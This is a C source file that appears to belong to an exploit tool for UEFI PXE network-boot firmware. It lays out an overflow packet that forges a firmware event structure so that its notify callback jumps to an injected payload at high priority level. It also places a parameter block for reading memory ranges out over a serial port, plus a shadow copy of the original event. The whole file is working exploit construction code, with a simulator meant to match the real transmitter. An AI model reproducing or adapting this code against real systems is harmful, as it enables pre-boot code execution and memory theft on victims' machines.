/* layout.c - single source of truth for the overflow region.
 *
 * Both the real transmitter and the host simulator go through this, so a test
 * that passes in the simulator exercises the same arithmetic the wire packet
 * uses. Nothing is firmware-specific except pool_base, which the operator
 * supplies.
 */

#include <string.h>
#include "pxe_layout.h"
#include "layout.h"

static size_t align16(size_t v) { return (v + 15u) & ~(size_t)15u; }

int layout_build(uint8_t *buf, size_t cap, const layout_cfg_t *cfg,
                 const uint8_t *payload, size_t payload_len,
                 const uint8_t *ranges, size_t range_n,
                 const uint8_t *shadow, layout_out_t *out)
{
  uint64_t ev = cfg->pool_base + cfg->event_off;
  size_t payload_off = OVF_PAYLOAD_DELTA;
  size_t ranges_off  = align16(payload_off + payload_len);
  size_t shadow_off  = align16(ranges_off + range_n * 16);
  size_t total       = shadow_off + GRAFT_EVENT_LEN;
  graft_args_t  ga;
  param_block_t pb;

  if (total > cap)
    return -1;

  memset(buf, 0, total);

  /* --- IEVENT ---------------------------------------------------------- */
  memset(&ga, 0, sizeof(ga));
  ga.signal_link_fwd = ev + EVT_OFF_SIGNALLINK;   /* self-loop: a signalled
                                                     event with an empty list */
  ga.signal_link_bwd = ev + EVT_OFF_SIGNALLINK;
  ga.notify_tpl      = 31;                        /* TPL_HIGH_LEVEL */
  ga.notify_fn       = ev + payload_off;
  ga.notify_ctx      = ev + OVF_PARAM_DELTA;
  build_event_graft(buf + OVF_EVENT_DELTA, GRAFT_EVENT_LEN, &ga);

  /* --- parameter block -------------------------------------------------- */
  memset(&pb, 0, sizeof(pb));
  pb.graft       = ev;
  pb.event       = ev;
  pb.shadow      = ev + shadow_off;
  pb.uart        = cfg->uart;
  pb.uart_stride = 1;
  pb.out_buf     = cfg->out_buf;
  pb.out_cap     = cfg->out_cap;
  pb.ranges      = ev + ranges_off;
  pb.range_n     = range_n;
  build_param_block(buf + OVF_PARAM_DELTA, PB_LEN, &pb);

  /* --- code and data ---------------------------------------------------- */
  if (payload_len)
    memcpy(buf + payload_off, payload, payload_len);
  if (range_n)
    memcpy(buf + ranges_off, ranges, range_n * 16);
  memcpy(buf + shadow_off, shadow, GRAFT_EVENT_LEN);

  if (out) {
    out->buf          = buf;
    out->len          = total;
    out->event_addr   = ev;
    out->param_addr   = ev + OVF_PARAM_DELTA;
    out->payload_addr = ev + payload_off;
    out->ranges_addr  = ev + ranges_off;
    out->shadow_addr  = ev + shadow_off;
    out->notify_tpl   = 31;
  }
  return (int)total;
}

size_t layout_find(const uint8_t *hay, size_t n, const uint8_t *needle,
                   size_t m)
{
  if (m == 0 || m > n)
    return (size_t)-1;
  for (size_t i = 0; i + m <= n; i++)
    if (memcmp(hay + i, needle, m) == 0)
      return i;
  return (size_t)-1;
}
